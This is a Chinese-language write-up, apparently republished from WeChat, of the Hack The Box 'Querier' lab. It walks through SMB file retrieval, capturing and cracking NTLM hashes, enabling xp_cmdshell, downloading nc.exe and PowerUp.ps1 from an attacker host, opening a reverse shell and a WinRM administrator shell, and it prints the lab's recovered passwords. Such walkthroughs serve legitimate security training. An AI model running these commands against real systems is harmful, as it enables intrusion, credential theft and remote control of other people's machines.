> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Qeq00SGpnCIRvCb_aQcfZg)

********文章来源｜MS08067 内网安全知识************星球******  
**

> 本文作者：**阿青**（Ms08067 内网安全小组成员）

querier 作为 htb 中的一个靶标环境，其中涉及的⼀些基础知识和工具应用值得学习，对该靶标的渗透流程如图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8thnibib0IZsyK0yVrFicHHx2LrNJ6Aw2GvU3pBcmzH5gNrcoq4lm4w22tQ3ofQ4O59icrPHIUuo6jVA/640?wx_fmt=png)

图一 整体流程  

*   目标 IP: 10.10.10.125
    
*   本机 IP: 10.10.14.6
    

**需要的工具**

1.  smbclient
    
2.  responder
    
3.  nc
    
4.  powerup.ps1
    
5.  nmap
    

  
**0x01 第一阶段：从信息收集到连接数据库**

```
# nmap -sC -sV -p- 10.10.10.125 -oA querier
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-16 00:56 EST
Nmap scan report for querier.htb (10.10.10.125)
Host is up (0.013s latency).
Not shown: 65521 closed ports
PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds?
1433/tcp open ms-sql-s Microsoft SQL Server 14.00.1000.00
| ms-sql-ntlm-info:
```

通过连接文件共享服务，可以下载一个名为 "Currency Volume Report.xlsm" 的文件。

```
smbclient -U QUERIER/invalid //10.10.10.125/Reports

smb: \> get "Currency Volume Report.xlsm"
```

在 Linux 下可以通过 strings 和 binwalk 来查看文件内容，这里是通过 `binwalk -e` 命令解压了 xlsm 文件，并用 strings 命令查看 vbaProject.bin 中存储的宏。

```
# strings vbaProject.bin
 macro to pull data for client volume reports
n.Conn]
Open
rver=<
SELECT * FROM volume;
word>
MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```

在 windows 下直接打开宏编辑器，如图

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8thnibib0IZsyK0yVrFicHHx2KLib0xdyXHPG8Zeo4oibopLCCTNRxaz7TH5sSH0Qbc72DlrX53iaIW62A/640?wx_fmt=png)

图二 宏信息

得到 sql-server 连接信息：

*   用户名: reporting
    
*   密码: PcwTWTHRwryjc$c6
    

使用 mssqlclient 连接数据库

```
mssqlclient.py -windows-auth querier/reporting:PcwTWTHRwryjc\$c6@$TARGET_IP
```

**0x02 第二阶段：从数据库到命令执行**  

**抓取 hash 请求**  

连接数据库后，发现没有权限执行命令。这里利用 xp_dirtree 去发送一个目录请求，并利用 responder 开启一个 smb server 认证服务来抓取 hash 信息。

```
# 开启responder
responder -I eth0 -wrf
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8thnibib0IZsyK0yVrFicHHx2MypOjcRELJ2tgBg9QfaMYYGOntwBPeYoH9hluKXXQjg6ZiaL09Mrhkg/640?wx_fmt=png)

发送一次 smb 认证请求

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8thnibib0IZsyK0yVrFicHHx2tTnOIoAIhdzz4AfUIYYsOUDniaddk3SL8ZIuVicKV1aqoSeHtyYknWsQ/640?wx_fmt=png)

图三 xp_dirtree  

hash 抓取结果

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8thnibib0IZsyK0yVrFicHHx20F7tUlGLdmvtPheu2HWiakGzupjKoVGPh3jA5kTic71bK3X5vKALic3Vg/640?wx_fmt=png)

**破解 hash**

利用 hashcat 破解抓到的 hash

```
hashcat -m 5600 ./test.nltmv2 ~/hacktools/worddic/rockyou.txt --force
```

可以利用 **_hashcat --example-hashes ｜ less_** 来方便地查看相关加密方式

破解结果:

```
MSSQL-SVC::QUERIER:7808a070c190110d:0ecfa929ab261b727253df84af7cf1f2:0101000000000000c0653150de09d20128624bd821667131000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d201060004000200000008003000300000
000000000000000000003000009828af224f44d2d8ddb8f0e488a92d1bfff623c7fb3b5448ed22e96f6842e89b0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003600000000000000000000000000:corporate568
```

用户名: mssql-svc

口令：corporate568

**使用 xp_cmdshell 执行命令**

开启 cmdshell

```
SQL> EXEC sp_configure 'show advanced options', 1;
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> xp_cmdshell "dir c:\users"
output
...
```

上传 nc 并反连

```
SQL> xp_cmdshell "powershell -command Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -OutFile c:\programdata\nc.exe"
SQL> xp_cmdshell "c:\programdata\nc.exe 10.10.14.6 1234 -e c:\windows\system32\cmd.exe"

# nc监听
nc -lvnp 1234
```

执行命令成功

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa8thnibib0IZsyK0yVrFicHHx2dE5PJSCI7Xr3wxpteuhE63OApLdianVGXKYn71vRRL8Gp4OKFxlplOw/640?wx_fmt=png)

图四 反连  

**0x03 第三阶段: admin 提权**

利用 PowerUp.ps1 脚本收集主机信息  

_Powerup 是本地特权提升的一些调用方法，功能相当强大，拥有众多实用的脚本来帮助我们寻找目标主机 Windows 服务漏洞进行提权，也是 PowerShell Empire 和 PowerSploit 的一部分。参考_ _https://blog.csdn.net/l1028386804/article/details/86089574/_

```
PS C:\Windows\system32> IEX (New-Object Net.Webclient).downloadstring("http://10.10.14.6/PowerUp.ps1")
PS C:\Windows\system32> invoke-allchecks
[*] Checking for cached Group Policy Preferences .xml files....
Changed : {2021-03-14 14:12:48}
UserNames : {Administrator}
NewName : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File : C:\ProgramData\Microsoft\GroupPolicy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
       C:\Windows\system32>powershell
```

利用 winrm 接口执行命令

_nmap 扫描时，目标开放了 5985 端口_

```
require 'winrm'

# Author: Alamot
conn = WinRM::Connection.new(
  endpoint: 'http://10.10.10.125:5985/wsman',
  user: 'querier\administrator',
  password: 'MyUnclesAreMarioAndLuigi!!1!',
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end

# ruby querier.rb

...
```

利用 wmiexec 连接

```
wmiexec.py Administrator:MyUnclesAreMarioAndLuigi\!\!1\!@10.10.10.125
```

**0x04 总结**

在对整个靶场的攻击中，前期的信息收集很重要，比如通过 nmap 扫描的 445 端口发现敏感文件，而后运用 sql-server 去实现命令执行，最后通过 5985 端口执行命令，同时，发现 sql_server 无法执行命令时，也可以尝试运用 xp_dirtree+responder 的方式进行突破。

**扫描下方二维码加入星球学习**  

**加入后邀请你进入内部微信群，内部微信群永久有效！**

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cT2rJYbRzsO9Q3J9rSltBVzts0O7USfFR8iaFOBwKdibX3hZiadoLRJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBVC2S4ujJibsVHZ8Us607qBMpNj25fCmz9hP5T1yA6cjibXXCOibibSwQmeIebKa74v6MXUgNNuia7Uw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicjovru6mibAFRpVqK7ApHAwiaEGVqXtvB1YQahibp6eTIiaiap2SZPer1QXsKbNUNbnRbiaR4djJibmXAfQ/640?wx_fmt=jpeg) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJ39cBtzvcja8GibNMw6y6Amq7es7u8A8UcVds7Mpib8Tzu753K7IZ1WdZ66fDianO2evbG0lEAlJkg/640?wx_fmt=png)  

**和 4000 + 位同学一起加入星球学习**  

![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif)